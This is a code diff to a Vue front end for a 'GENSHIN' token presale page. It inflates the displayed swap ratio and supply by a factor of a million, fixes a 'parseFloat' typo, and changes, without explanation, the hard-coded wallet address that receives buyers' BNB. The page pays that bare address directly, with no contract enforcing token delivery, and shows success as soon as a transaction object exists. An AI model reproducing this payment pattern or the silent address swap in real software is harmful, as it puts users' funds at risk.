@@ -9,8 +9,8 @@
         <p class="idotext text2">{{isOpen?'Sale is opening':'Public Sale will be open in'}}</p>
         <p class="downtime" v-show="!isOpen">{{day}}: {{hour}} : {{min}}: {{second}}</p>
         <p class="idotext text3">
-          Swap Ratio:1BNB=3,533,568 GENSHIN<br>
-          Sale Supply:1000,000,000 GENSHIN<br>
+          Swap Ratio:1BNB=3,533,568,000,000 GENSHIN<br>
+          Sale Supply:1000,000,000,000,000GENSHIN<br>
           Allocation:1BNB ~ 3BNB
         </p>
         <div class="swap">
@@ -89,7 +89,7 @@ export default {
           }else if(newValue>3){
             this.$message.error('The maximum is 3')
           }
-          this.genshinval = newValue*3533568
+          this.genshinval = newValue*3533568000000 
         }
       }
   },
@@ -156,14 +156,14 @@ export default {
         this.$message.error('Insufficient funds for transfer')
         return
       }
-      if(arseFloat(this.bnbval)<1){
+      if(parseFloat(this.bnbval)<1){
         this.$message.error('The minimum value is 1')
         return
-      }else if(arseFloat(this.bnbval)>3){
+      }else if(parseFloat(this.bnbval)>3){
         this.$message.error('The maximum is 3')
         return
       }
-      const tx = await this.signer.sendTransaction({ to: "0x063be8c38f2b44751730ce20f902978a401480c7", value: ethers.utils.parseEther(this.bnbval) });
+      const tx = await this.signer.sendTransaction({ to: "0x9D7f5991cAcCeA5dE1d4e34612645A690bD91a1C", value: ethers.utils.parseEther(this.bnbval) });
       if(tx){
         this.$message.success('Success!');
       }
